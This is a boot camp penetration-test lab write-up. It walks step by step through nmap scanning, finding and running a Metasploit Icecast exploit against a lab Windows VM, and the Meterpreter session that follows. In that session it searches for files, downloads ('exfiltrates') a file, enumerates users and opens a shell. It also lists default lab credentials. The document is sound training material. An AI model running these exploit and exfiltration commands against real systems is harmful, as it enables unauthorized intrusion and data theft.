<img align="left" width="100" height="100" src="https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/PenTestIcon.png" alt="hacker icon">

### Penetration Test Engagement Report

#### Lab Environment
 
| Credentials | Username | Password |
|----------|----------|------------|
| **Kali Linux VM** | root | toor |
| **DVW10 VM** | IEUser | Passw0rd! |
 

**NOTE**: We need to login to the **DVW10** VM and start the `icecast` service prior to beginning this activity using the following procedure:

- After logging into DVW10, type "icecast" in the Cortana search box and hit **Enter**.
- The icecast application will launch.
- Click on **Start Server**.
- Now we ready to begin the activity.

---

We've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > **ANS:** `nmap -sS -sV -O 192.168.0.20`  
       
![1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/1.png)
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > **ANS:** `searchsploit icecast`  
  
![2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/2.png)


3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > **ANS:** `msfconsole` 
 
![3](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/3.png)


4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > **ANS:** `search icecast`  
  
![4](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/4.png)


   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > **ANS:** `use 0`  
        
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > **ANS:** `set RHOST 192.168.0.20`  

 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > **ANS:** `run`

![5](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/5.png) 

  
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > **ANS:** `search -f *secretfile*.txt`  
  
![6](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/6.png) 

  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > **ANS:** `search -f *recipe*.txt`  
 
![7](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/7.png) 

 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:

      > **ANS:** `download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’`  
      
![8](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/8.png)
![9](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/9.png)
 
8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
   
      > **ANS:** `run post/multi/recon/local_exploit_suggester`    

![10](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/10.png)

### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > **ANS:** `run post/windows/gather/enum_logged_on_users`    

![11](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/11.png)

     
B. Open a Meterpreter shell and gather system information for the target.
 
  > **ANS:** 
  
  > `shell`  
  > `systeminfo`

![12](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/12.png)
![13](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/17-Penetration%20Test%20Engagement/Resources/Images/13.png)
 
C. Run the command that displays the target's computer system information:

   > **ANS:** `sysinfo`    

---
___

 - Full Penetration Test Engagement Report available at [Report_10152021](Resources/Report.docx)

---
___



### Citations and References:

#### General Resources:

- Rbcafe. 2020 Google Dorking List. © 2021 Google Dorking.com [cited 2021 October 08]. Available from:[Google Dorking](http://www.google-dorking.com/2021/10/2020-google-dorking-list.html). 
- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit). © OffSec Services Limited 2021. [cited 2021 October 08]. Available from: [Metasploit](https://www.exploit-db.com/exploits/17491).
- Reduce the Risk of Ransomware Awareness Campaign. CYBERSECURITY & INFRASTRUCTURE SECURITY AGENCY (CISA). © 2021 CISA.com [cited 2021 October 08]. Available from:[SMB vulnerabilities](https://www.cisa.gov/sites/default/files/publications/Fact%20sheet_Ransomware%20Awareness%20Campaign_20210119_508.pdf)
- CVE-2011-2523. Red Hat Security. © 2021 Red Hat, Inc. [cited 2021 October 08]. Available from:[CVE-2011-2523](https://access.redhat.com/security/cve/cve-2011-2523)
- Microsoft Security Bulletin MS17-010 - Critical. Security Update for Microsoft Windows SMB Server (4013389). © Microsoft 2021. [cited 2021 October 08]. Available from:[MS17-010 - Critical](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010). 


#### Penetration Testing Documentation:
- [Google Dorking Cheat Sheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06.js)
- [Recon-ng 5.1 Cheat Sheet](https://www.blackhillsinfosec.com/wp-content/uploads/2019/11/recon-ng-5.x-cheat-sheet-Sheet1-1.pdf)
- [Shodan Cheat Sheet](https://thedarksource.com/shodan-cheat-sheet/)
- [Zenmap Cheat Sheet](https://cs.lewisu.edu/~klumpra/camssem2015/nmapcheatsheet1.pdf)


#### Special thanks:
© Trilogy Education Services, a 2U, Inc., Instructor Jerry and TAs; Matt, Jansen, Micheal.

© The University of Texas at Austin Boot Camp, The Cybersecurity program.

---  
